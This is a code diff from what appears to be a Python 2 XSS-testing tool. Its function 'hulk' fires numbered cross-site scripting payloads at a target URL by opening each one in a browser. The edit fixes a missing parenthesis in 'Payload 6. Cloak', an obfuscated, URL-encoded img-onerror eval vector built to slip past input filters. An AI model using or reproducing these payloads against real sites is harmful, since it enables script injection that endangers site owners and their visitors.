@@ -707,7 +707,7 @@ def hulk():
     webbrowser.open(magic)
     work = raw_input("\033[1;34m[?]\033[1;m Press enter to execute next payload")
     print "\033[1;33m[!]\033[1;m Payload 6. Cloak"
-    cloak = URL.replace("d3v", "%3c%69%4d%67%20%73%52%63%3d%78%3a%61%6c%65%72%74%60%60%20%6f%4e%45%72%72%6f%72%3d%65%76%61%6c%28%73%72%63%29%3e"
+    cloak = URL.replace("d3v", "%3c%69%4d%67%20%73%52%63%3d%78%3a%61%6c%65%72%74%60%60%20%6f%4e%45%72%72%6f%72%3d%65%76%61%6c%28%73%72%63%29%3e")
     webbrowser.open(cloak)
     print "\033[1;33m[!]\033[1;m Hulk's stamina is over. Exiting..."
     sys.exit()
